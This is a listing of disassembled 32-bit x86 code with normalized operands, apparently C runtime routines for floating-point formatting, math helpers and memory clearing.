jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_412089
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_415d79
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
lea ecx [ esi + 0x2 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
push r--data
push ebx
push esi
call sub_415600
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_41ba60
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_415f1f
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41bf3d
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_415db2
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_41bdc5
add esp 0x10
cmp eax ebx
je r-xdata
sub_41600b
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_410556
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_412089
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
cmp [ ebp + 0x10 ] eax
mov [ esi ] 0x0
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_412089
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_41202a
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_415fed
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
cmp [ ebp + 0x14 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_41b8e0
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41c0b0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41c0b0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_40fb30
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_41c0b0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_41bfd0
add al 0x30
mov [ esi ] al
inc esi
cmp esi edi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_41bfd0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_41bfd0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41637c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_410556
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_415d79
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_415d79
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_415d79
push edi
push 0x30
push esi
call sub_40fb30
add esp 0xc
sub_416471
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41bf3d
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41637c
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_41bdc5
add esp 0x10
cmp eax ebx
je r-xdata
sub_41652a
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41bf3d
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_41202a
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
cmp ecx 0xffffffff
lea edi [ eax + esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_41bdc5
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_415db2
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41637c
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_416622
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415f1f
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416471
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41600b
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41652a
jmp r-xdata
sub_4166a8
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416622
add esp 0x1c
pop ebp
retn
sub_4166c9
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_41c0cf
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
sub_4166f2
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_41672e
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_4166f2
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_416757
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4167ae
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_4167ae
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_416757
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41687e
mov edx 0x0
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
cmpsd xmm1 xmm0 0x0
pextrw eax xmm1 0x0
cmp eax 0x0
ja r-xdata
sub ecx 0x3fe
add ecx edx
cvtsi2sd xmm6 ecx
unpcklpd xmm6 xmm6
shl ecx 0xa
add eax ecx
mov ecx 0x10
mov edx 0x0
cmp eax 0x0
cmove edx ecx
movapd xmm1 [ r--data ]
movapd xmm3 xmm0
movapd xmm2 [ r--data ]
mulpd xmm1 xmm0
mulpd xmm3 xmm3
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm3
movapd xmm5 [ r--data ]
mulpd xmm6 xmm5
movapd xmm5 [ edx + r--data ]
andpd xmm4 xmm5
addpd xmm7 xmm6
addpd xmm7 xmm4
mulpd xmm1 xmm0
mulsd xmm3 xmm0
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulpd xmm2 xmm0
movapd xmm6 xmm7
unpckhpd xmm6 xmm6
mulpd xmm1 xmm3
sub esp 0x10
movapd xmm0 xmm1
addpd xmm1 xmm2
unpckhpd xmm0 xmm0
addsd xmm0 xmm1
addsd xmm0 xmm6
addsd xmm0 xmm7
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm2 [ r--data ]
divsd xmm2 xmm0
movlpd xmm1 [ r--data ]
mov edx 0x8
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm1
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x10
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_417c67
fld [ esp + 0x10 ]
add esp 0x1c
retn
movlpd xmm1 [ r--data ]
mulsd xmm0 xmm1
mov edx 0xffffffcc
jmp r-xdata
cmp ecx 0x7fe
ja r-xdata
movapd xmm5 xmm0
unpcklpd xmm0 xmm0
psrlq xmm5 0x34
pextrw ecx xmm5 0x0
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
movapd xmm3 [ r--data ]
movapd xmm4 [ r--data ]
movapd xmm6 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm3
addpd xmm4 xmm0
pextrw eax xmm4 0x0
and eax 0x7f0
movapd xmm4 [ eax + r--data ]
movapd xmm7 [ eax + r--data ]
andpd xmm6 xmm0
subpd xmm0 xmm6
mulpd xmm6 xmm4
subpd xmm6 xmm2
addsd xmm7 xmm6
mulpd xmm0 xmm4
movapd xmm4 xmm0
addpd xmm0 xmm6
and ecx 0xfff
sub ecx 0x1
cmp ecx 0x7fd
ja r-xdata
add ecx 0x1
and ecx 0x7ff
cmp ecx 0x7ff
jae r-xdata
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm2
cmpsd xmm2 xmm0 0x0
pextrw eax xmm2 0x0
cmp eax 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movlpd xmm0 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd ecx xmm2
and ecx 0xfffff
or eax ecx
cmp eax 0x0
je r-xdata
xorpd xmm1 xmm1
divsd xmm1 xmm1
mov edx 0x9
mov edx 0x3e9
jmp r-xdata
fld [ r--data ]
retn
mov edx 0x3e9
jmp r-xdata
sub_416aeb
add eax 0x0
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_416c91
or eax eax
je r-xdata
fxch st1
jmp sub_416ea6
xor ch ch
cmp eax 0x2
je r-xdata
call sub_416c4e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
cmp [ rw-data ] 0x1
je r-xdata
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
call sub_41cb91
fdivrp st1
jmp r-xdata
jmp sub_416df8
fchs
sub_416b01
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_416c4e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
cmp [ rw-data ] 0x1
je r-xdata
or ch ch
je r-xdata
fscale
call sub_41cb91
fdivrp st1
jmp r-xdata
jmp sub_416df8
fchs
sub_416bbd
call sub_416c91
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ rw-data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_416c4e
fld st0
fabs
fld [ rw-data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_416e06
fstp st0
fld [ rw-data ]
or ch ch
je r-xdata
retn
fchs
sub_416c91
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ rw-data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_416cc5
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_41c25a
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp sub_416eb9
sub_416d00
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx rw-data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_416e67
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x7
jmp r-xdata
faddp st1
retn
sub_416f15
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_416fa5
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_417060
pop edx
retn
call sub_417077
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_417060
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_41d12b
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_417077
push ebp
